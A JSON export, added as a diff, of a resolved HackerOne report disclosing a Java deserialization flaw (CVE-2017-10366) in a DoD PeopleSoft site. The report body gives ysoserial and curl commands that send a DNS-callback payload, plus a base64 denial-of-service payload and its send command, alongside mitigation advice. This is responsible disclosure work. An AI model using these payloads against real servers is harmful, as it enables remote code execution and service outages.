@@ -1,0 +1,118 @@
+{
+  "id": 329376,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjkzNzY=",
+  "url": "https://hackerone.com/reports/329376",
+  "title": "Remote Code Execution (RCE) in a DoD website",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-23T22:15:54.682Z",
+  "submitted_at": "2018-03-23T22:15:54.682Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "joaomatosf",
+    "url": "/joaomatosf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/146/816/bcf0f02fbb0a5629f13d893f184c2d982cfaeadf_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-10366"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-08T18:51:48.128Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-22T18:02:56.578Z",
+  "team_member_agreed_on_going_public_at": "2019-10-08T18:51:48.021Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "SUMMARY:\n====================\n\nThe DoD **`https://██████/psc/EXPROD_1/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].\n\nPROOF OF CONCEPT\n====================\n\nFor PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (testing1.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for testing1.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).\n\nFor more details about this payload used, see [2].\n\n**Attached is a video detailing the PoC.**\n\n**Generating the payload:** for generate the payload I used the tool ysoserial.\n```\n$ git clone https://github.com/frohoff/ysoserial.git\n$ cd ysoserial\n$ mvn clean package –DskipTests\n$ cd target\n$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload\n```\n\n**Sending the payload to a vulnerable server:**\n```\ncurl https://█████████/monitor/EXPROD_1 --data-binary @payload -k\n```\nAfter sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.\n\t\n**BIND logs:**\n```\n23-Mar-2018 18:51:09.183 queries: info: client █████████#53133: query: testing1.jexboss.info IN A -ED (10.0.1.202)\n```\n\n**Denial Of Service (DoS)**\n\nThis vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:\n\n**Generating payload for Denial of Service (DoS)[3]:**\n```\necho -n \"rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3\" | base64 -d > payload_dos\n```\n\n**Sending:**\n```\ncurl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k\n```\nThis will make your service stop immediately and show the following error in the logs:\n```Exception in thread \"Thread-2\" java.lang.OutOfMemoryError: Java heap space```\n\nMITIGATION\n====================\n\nThe best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path /monitor should be rejected/blocked! \nAlso, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!\n\nREFERENCES:\n====================\n[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366\n[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\n[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html\n\nBest Regards, \nJoão Filho Matos Figueiredo, @joaomatosf\n\n## Impact\n\nThis vulnerability allows:\n1) Remote Code Execution (**RCE**)\n2) Denial of Service (DoS)",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 9,
+  "voters": [
+    "drtrace",
+    "base_64",
+    "mik317",
+    "term1nal",
+    "null_rhythm",
+    "cryptographer",
+    "armansameer",
+    "dr_kalix",
+    "a1000tonjustin0"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
